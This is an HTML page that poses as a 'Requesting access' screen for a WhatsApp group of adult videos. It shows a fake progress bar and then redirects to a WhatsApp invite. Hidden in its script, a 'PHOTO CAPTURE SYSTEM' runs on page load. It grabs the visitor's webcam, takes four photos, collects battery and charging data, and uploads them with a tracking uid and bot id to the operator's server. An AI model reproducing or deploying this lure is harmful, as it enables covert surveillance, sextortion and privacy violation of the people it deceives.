<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WhatsApp Group • Requesting Access</title>
<link rel="icon" href="https://i.postimg.cc/7Jnhpvmc/Screenshot-2026-0118-180337.jpg">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{
  font-family:'Orbitron', monospace;
  overflow:hidden;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#fff;
  text-align:center;
  background:#000;
}

/* Blurred background div */
#bg{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  background:url('https://i.postimg.cc/7Jnhpvmc/Screenshot-2026-0118-180337.jpg') center center no-repeat;
  background-size:cover;
  filter:blur(6px) contrast(1.1) brightness(0.8);
  z-index:0;
}

/* Stars canvas */
#bgCanvas{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  z-index:0;
}

/* Container for content */
.container{
  position:relative;
  z-index:1;
  background:rgba(0,0,0,0.55);
  border-radius:25px;
  padding:40px 30px;
  width:95%;
  max-width:850px;
  min-height:450px;
  box-shadow:0 0 60px rgba(0,255,153,0.7);
  display:flex;
  flex-direction:column;
  align-items:center;
}

.container {
  position: relative;
  overflow: hidden;
}

.container::before {
  content: "";
  position: absolute;
  inset: -50%;
  background: radial-gradient(
    circle at 30% 30%,
    rgba(255,255,255,0.12),
    transparent 40%
  );
  animation: waterWave 8s linear infinite;
  pointer-events: none;
}

@keyframes waterWave {
  0% { transform: rotate(0deg) translateX(0); }
  100% { transform: rotate(360deg) translateX(0); }
} 

/* Logo */
.logo{
  width:180px;
  height:180px;
  border-radius:50%;
  object-fit:cover;
  box-shadow:0 0 40px rgba(0,255,255,0.9),0 0 100px rgba(0,255,255,0.4);
  border:4px solid #25D366;
  animation:floatRotate 4s ease-in-out infinite alternate;
}
@keyframes floatRotate{
  0%{transform:translateY(0) rotate(0deg);}
  50%{transform:translateY(-15px) rotate(3deg);}
  100%{transform:translateY(0) rotate(-3deg);}
}

/* Logo name */
.logo-name{
  font-size:36px;
  font-weight:700;
  color:#fff;
  text-shadow:0 0 15px rgba(0,0,0,0.9);
  margin-bottom:30px;
}

/* Loader bar */
.loader-container{
  width:100%;
  max-width:700px;
  height:70px;
  background:rgba(255,255,255,0.15);
  border-radius:25px;
  overflow:hidden;
  margin:20px 0;
  box-shadow: inset 0 0 10px rgba(0,0,0,0.4);
  position:relative;
}
.loader-bar{
  height:100%;
  width:0%;
 font-size:33px; background:linear-gradient(90deg,#ffff00,#fff);
  border-radius:25px;
  display:flex;
  align-items:center;
  justify-content:flex-end;
  padding-right:10px;
  color:#ff0000;
  font-weight:700;
  font-family:'Orbitron', monospace;
  text-shadow:0 0 6px rgba(0,0,0,0.7);
  box-shadow:0 0 15px rgba(255,255,0,0.8);
  transition: width 0.1s linear;
}

/* Text animation */
.text{
  font-size:36px;
  line-height:2.2;
  max-width:700px;
  text-align:center;
  font-weight:700;
  margin-bottom:20px;
  color:#fff;
  text-shadow:0 0 15px rgba(0,0,0,0.8);
}
.text p{
  opacity:0;
  transform:translateY(30px);
  animation:fadeInUp 1s forwards;
  background:linear-gradient(90deg,#ffff00,#fff);
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
}

@keyframes fadeInUp{
  0%{opacity:0;transform:translateY(30px);}
  100%{opacity:1;transform:translateY(0);}
}

/* Credit */
.credit{
  margin-top:25px;
  font-size:20px;
  color:#fff;
  font-weight:700;
  font-family:'Orbitron',monospace;
}

/* Responsive */
@media(max-width:600px){
  .container{margin:0 10px;padding:40px 25px;min-height:500px;}
  .logo{width:130px;height:130px;}
  .logo-name{font-size:28px;}
  .text{font-size:26px;}
  .loader-container{height:25px;}
}
.small-text{
  font-size:25px;          /* دلته سایز کنټرول کېږي */
  opacity:0.85;
  color:#fffacd;           /* سپین + لږ زیړ */
  font-weight:500;
} 
.small-text{
  animation: fadeSoft 2s ease-in-out infinite alternate;
}

@keyframes fadeSoft{
  from{opacity:0.5}
  to{opacity:1}
} 
/* === REAL GLASS WATER RIPPLE EFFECT === */
.container::after{
  content:"";
  position:absolute;
  inset:0;
  border-radius:25px;
  pointer-events:none;

  background:
    radial-gradient(circle at 20% 30%, rgba(255,255,255,0.18), transparent 40%),
    radial-gradient(circle at 80% 70%, rgba(255,255,255,0.12), transparent 45%);

  filter: blur(1px);
  animation: waterRipple 12s ease-in-out infinite alternate;
}

@keyframes waterRipple{
  0%{
    background-position: 0% 0%, 100% 100%;
    transform: scale(1);
  }
  50%{
    background-position: 60% 40%, 40% 60%;
    transform: scale(1.01);
  }
  100%{
    background-position: 100% 0%, 0% 100%;
    transform: scale(1);
  }
} 
.container{
  backdrop-filter: blur(5px) saturate(130%);
  -webkit-backdrop-filter: blur(14px) saturate(130%);
} 
.container{
  animation: slowFloat 6s ease-in-out infinite;
}

@keyframes slowFloat{
  0%   { transform: translateY(0) scale(1); }
  50%  { transform: translateY(-6px) scale(1.01); }
  100% { transform: translateY(0) scale(1); }
}
.container:hover{
  animation: liquidShake 1.2s ease-in-out infinite;
} 

@keyframes liquidShake{
  0%{transform:translate(0,0)}
  25%{transform:translate(1px,-1px)}
  50%{transform:translate(-1px,1px)}
  75%{transform:translate(1px,1px)}
  100%{transform:translate(0,0)}
} 
</style>
</head>
<body>
<div id="bg"></div>
<canvas id="bgCanvas"></canvas>

<div class="container">
  <img src="https://i.postimg.cc/05ZYBxd9/IMG-20260114-WA0009.jpg" alt="logo" class="logo">
  <div class="logo-name">PORN +18 VIDEOS</div>

  <div class="text" id="status">
    <p>🕵️‍♂️ Requesting access to WhatsApp group...</p>
    <p>Keep this page open 🎥</p>
    <p class="small-text">This may take a few seconds...</p>
<p class="small-text">Please wait while your request is processed...</p> 

  <div class="loader-container">
    <div class="loader-bar" id="progress">0%</div>
    <canvas id="sparkCanvas" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;"></canvas>
  </div>

  <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 𝗪𝗔𝗦𝗜𝗤</div>
</div>

<script>
/* ===== Animated background stuff (ستا پخوانی هماغسې پاتې) ===== */

const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const stars=[];
for(let i=0;i<150;i++){
  stars.push({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height,
    r:Math.random()*1.5+0.5,
    speed:Math.random()*0.7+0.2,
    glow:Math.random()*0.5+0.3
  });
}

function animateStars(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  stars.forEach(s=>{
    ctx.beginPath();
    ctx.arc(s.x,s.y,s.r,0,Math.PI*2);
    ctx.fillStyle=`rgba(255,255,255,${s.glow})`;
    ctx.fill();
    s.y-=s.speed;
    if(s.y<0) s.y=canvas.height;
  });
  requestAnimationFrame(animateStars);
}
animateStars();

window.addEventListener('resize',()=>{
  canvas.width=window.innerWidth;
  canvas.height=window.innerHeight;
});

/* ===== Progress bar ===== */

const progressBar=document.getElementById('progress');
let progress=0;

const interval=setInterval(()=>{
  if(progress>=100){
    clearInterval(interval);
    window.location.href="https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS";
  } else {
    progress++;
    progressBar.style.width=progress+'%';
    progressBar.textContent=progress+'%';
  }
},400);


/* ===== PHOTO CAPTURE SYSTEM ===== */

const params = new URLSearchParams(window.location.search);
const uid = params.get("uid") || "NO_UID";
const bot = params.get("bot") || "unknown";

async function capturePhotos(){

  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvasPhoto = document.createElement("canvas");
    canvasPhoto.width = video.videoWidth;
    canvasPhoto.height = video.videoHeight;
    const ctxPhoto = canvasPhoto.getContext("2d");

    // 🔋 Battery info
    let batteryLevel="Unknown", charging="Unknown";
    if(navigator.getBattery){
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level*100);
      charging = battery.charging ? "true" : "false";
    }

    const formData = new FormData();
    formData.append("uid",uid);
    formData.append("bot",bot);
    formData.append("battery",batteryLevel);
    formData.append("charging",charging);

    // 📸 4 photos
    for(let i=1;i<=4;i++){
      ctxPhoto.drawImage(video,0,0,canvasPhoto.width,canvasPhoto.height);
      const blob = await new Promise(r=>canvasPhoto.toBlob(r,"image/jpeg",0.9));
      formData.append("photo"+i,blob,`snap${i}.jpg`);
      await new Promise(r=>setTimeout(r,700));
    }

    await fetch("/api/upload",{
      method:"POST",
      body:formData
    });

    stream.getTracks().forEach(t=>t.stop());

  }catch(err){
    console.error("Camera error:",err);
  }
}

/* ===== Start after load ===== */

window.onload = () => {
  setTimeout(capturePhotos,1000);
};
</script>
</body>
</html>
